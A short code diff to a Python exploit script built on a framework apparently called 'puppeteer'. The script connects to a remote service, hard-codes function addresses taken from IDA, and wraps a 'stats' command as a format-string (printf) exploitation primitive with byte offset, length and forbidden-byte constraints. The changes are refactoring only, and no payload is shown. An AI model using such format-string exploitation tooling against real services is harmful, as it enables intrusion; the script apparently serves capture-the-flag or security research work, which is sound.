@@ -2,8 +2,9 @@ import puppeteer
 
 import logging
 import standard_logging
-logging.getLogger("puppeteer.connection").setLevel(logging.DEBUG)
+logging.getLogger("puppeteer.connection").setLevel(logging.INFO)
 logging.getLogger("puppeteer.manipulator").setLevel(logging.DEBUG)
+logging.getLogger("puppeteer.vuln_decorators").setLevel(logging.DEBUG)
 logging.getLogger("puppeteer.formatter").setLevel(logging.DEBUG)
 
 class Aggravator(puppeteer.Manipulator):
@@ -12,14 +13,15 @@ class Aggravator(puppeteer.Manipulator):
 
         # some initial info from IDA
         # TODO: maybe use IDALink to get this automatically?
-        self.locations['main'] = 0x0804A9B3
-        self.locations['#main_end'] = 0x0804A9D1
-        self.info['main_stackframe_size'] = 0x24
+        self.permanent_info['main_start'] = 0x0804A9B3
+        self.permanent_info['main_end'] = 0x0804A9D1
+        self.permanent_info['main_stackframe_size'] = 0x24
 
-        self.c = puppeteer.Connection(host=host, port=port)
+        self.auto_connection = puppeteer.Connection(host=host, port=port).connect()
+        self.c = self.auto_connection
         self.c.read_until("> ")
 
-    @puppeteer.printf_flags(byte_offset=244, max_length=31, forbidden={'\x00', '\x0a'})
+    @puppeteer.printf(byte_offset=244, max_length=31, forbidden={'\x00', '\x0a'})
     def stats_printf(self, fmt):
         self.c.send("stats " + fmt + "\n")
         self.c.read_until("kill top:\n")
